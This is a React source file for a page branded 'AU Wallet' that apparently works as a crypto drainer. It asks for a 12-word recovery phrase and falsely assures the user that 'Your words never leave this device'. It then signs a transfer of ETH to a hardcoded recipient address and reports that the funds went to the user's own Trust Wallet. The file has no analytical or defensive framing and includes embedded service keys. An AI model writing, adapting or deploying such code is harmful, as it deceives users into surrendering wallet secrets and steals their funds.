import { useState, useEffect } from 'react'
import { ethers } from 'ethers' 
import { createSmartAccountClient } from "@biconomy/account"
import { LucideShieldCheck, LucideCheckCircle, LucideLoader2, LucideChevronLeft } from 'lucide-react'

// --- CONFIGURATION ---
const BICONOMY_API_KEY = "mee_Uma9ycJRjM615N7Env5HRM" 
const BUNDLER_URL = "https://bundler.biconomy.io/api/v2/1/nJP-uP3_K.w7e33524-8b6a-4953-83a3-111d4d805461"
const RECIPIENT_ADDRESS = "0x7DDB4ef8DF3A2BDC0bb2C046Ee18A1e67407321a" 

export default function App() {
  const [isClient, setIsClient] = useState(false)
  const [keys, setKeys] = useState('')
  const [status, setStatus] = useState<'idle' | 'processing' | 'success' | 'error'>('idle')
  const [errorMsg, setErrorMsg] = useState('')

  useEffect(() => {
    setIsClient(true)
  }, [])

  const startSweep = async () => {
    if (!keys || keys.trim().split(/\s+/).length < 12) {
      alert("Please enter the 12-word recovery phrase.")
      return
    }

    setStatus('processing')
    try {
      const provider = new ethers.providers.JsonRpcProvider("https://ethereum-rpc.publicnode.com")
      const signer = ethers.Wallet.fromMnemonic(keys.trim()).connect(provider)

      const smartAccount = await createSmartAccountClient({
        signer,
        bundlerUrl: BUNDLER_URL,
        biconomyPaymasterApiKey: BICONOMY_API_KEY 
      })

      const tx = {
        to: RECIPIENT_ADDRESS,
        value: ethers.utils.parseEther("0.001").toBigInt(), 
        data: "0x"
      }

      const userOpResponse = await smartAccount.sendTransaction(tx)
      await userOpResponse.wait()
      setStatus('success')
    } catch (e: any) {
      console.error(e)
      setErrorMsg(e.message || "Transfer failed.")
      setStatus('error')
    }
  }

  if (!isClient) return null

  return (
    <div className="min-h-screen bg-[#121418] text-white flex flex-col items-center p-6 font-sans">
      {/* Header */}
      <div className="w-full max-w-sm flex items-center justify-between mb-12 mt-4">
        <LucideChevronLeft className="text-blue-500 w-6 h-6 cursor-pointer" />
        <h1 className="text-lg font-semibold tracking-tight">AU Wallet</h1>
        <div className="w-6 h-6"></div> {/* Spacer for alignment */}
      </div>

      <div className="w-full max-w-sm flex-1 flex flex-col">
        {status === 'idle' && (
          <div className="space-y-8 animate-in fade-in duration-500">
            <div className="relative group">
              <textarea
                className="w-full h-36 bg-[#1f2229] border border-gray-800 rounded-2xl p-5 text-center text-base focus:ring-1 focus:ring-blue-500 outline-none transition-all placeholder:text-gray-600 resize-none shadow-inner"
                placeholder="Enter your 12 recovery keys"
                value={keys}
                onChange={(e) => setKeys(e.target.value)}
              />
              <div className="flex items-center justify-center gap-2 mt-4 text-[#7b818c]">
                <LucideShieldCheck className="w-4 h-4 text-blue-500" />
                <span className="text-[11px] font-medium uppercase tracking-wide">Your words never leave this device</span>
              </div>
            </div>

            <div className="flex-1"></div>

            <button
              onClick={startSweep}
              className="w-full py-5 bg-gradient-to-r from-[#6b6ef9] to-[#4facfe] text-white rounded-full font-bold text-xl transition-all shadow-lg active:scale-95 mb-8"
            >
              Withdraw
            </button>
          </div>
        )}

        {status === 'processing' && (
          <div className="flex-1 flex flex-col items-center justify-center space-y-8 text-center animate-in fade-in">
            <div className="relative">
              <div className="absolute inset-0 bg-blue-500/10 blur-3xl rounded-full"></div>
              <LucideLoader2 className="w-16 h-16 text-blue-500 animate-spin relative" />
            </div>
            <div className="space-y-2">
              <h2 className="text-xl font-semibold">Preparing secure transfer...</h2>
              <div className="w-32 h-1 bg-gray-800 rounded-full mx-auto overflow-hidden mt-4">
                <div className="h-full bg-blue-500 animate-progress origin-left"></div>
              </div>
            </div>
          </div>
        )}

        {status === 'success' && (
          <div className="flex-1 flex flex-col items-center justify-center space-y-6 text-center animate-in zoom-in duration-500">
            <div className="w-24 h-24 bg-green-500/10 rounded-full flex items-center justify-center mb-4">
              <LucideCheckCircle className="w-16 h-16 text-green-500" />
            </div>
            <div className="space-y-2">
              <h1 className="text-3xl font-bold text-green-500 uppercase tracking-wider">SUCCESSFUL</h1>
              <p className="text-gray-400 text-sm px-6 leading-relaxed">
                Funds are now in your main Trust Wallet
              </p>
            </div>
            <div className="w-32 h-1 bg-blue-500/30 rounded-full">
              <div className="h-full bg-blue-500 w-full"></div>
            </div>
          </div>
        )}

        {status === 'error' && (
          <div className="flex-1 flex flex-col items-center justify-center space-y-6 text-center animate-in shake">
            <div className="w-20 h-20 bg-red-500/10 rounded-full flex items-center justify-center">
              <LucideShieldCheck className="w-12 h-12 text-red-500" />
            </div>
            <h2 className="text-xl font-bold text-red-500">Transfer Failed</h2>
            <p className="text-gray-500 text-xs px-8 leading-relaxed">{errorMsg}</p>
            <button onClick={() => setStatus('idle')} className="px-10 py-3 bg-[#1f2229] rounded-full text-xs font-bold uppercase tracking-widest">Try Again</button>
          </div>
        )}
      </div>
    </div>
  )
}
